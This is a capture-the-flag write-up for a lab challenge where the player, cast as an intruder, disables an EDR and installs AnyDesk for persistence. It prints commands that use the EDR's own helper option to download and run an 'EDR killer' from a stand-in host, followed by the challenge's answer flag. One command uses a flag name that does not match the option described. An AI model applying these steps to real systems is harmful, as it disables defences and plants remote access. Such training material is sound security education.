# O6: Bypass the EDR

### Description
You cashed in your creds and now have initial access to a host in The Lucky Lion's internal network - one step closer to payday!! You better make sure you've got more than one way into this environment in case someone kicks you out - perhaps it would be prudent to download and install some remote management software for future use.

That might be easier said than done, though... you expect The Lucky Lion's security tools might give you trouble. Fortunately, another member of The Mound has written an EDR killer ("f4c3st4b") specific to the EDR you identified earlier. The only issue might be getting it on the host.

### Objectives
Download AnyDesk on the victim machine

It's not as easy as it sounds!

flag_goes_here

wicys2024{flag_goes_here}

{flag_goes_here}

would all be accepted as valid flags.

### Solution
Firstly, let us find the PID for EDR by running the following to list all the running processes:
```bash
ps -A
```

From the output, it tells us that the EDR, cguard, is running on the PID of 10. 

Then we run ``/usr/bin/cguard -h` to see the options for the cguard EDR. The `--script` flag stands out:
```bash
--script SCRIPT    Download and run helper script
```

Let's try to download and run the script with cguard:
```bash
cguard --status https://github.com.example/the-mound/facestab/releases/download/v4.2.0/facestab -p 10
```

It works! Check that the EDR is killed off with the command, `cguard --status`. After confirming the EDR has been disabled, download AnyDesk on the machine:
```bash
curl https://anydesk.com.example/downloads/anydesk.bin
```

Flag is `wicys2024{anydeskanytime}`
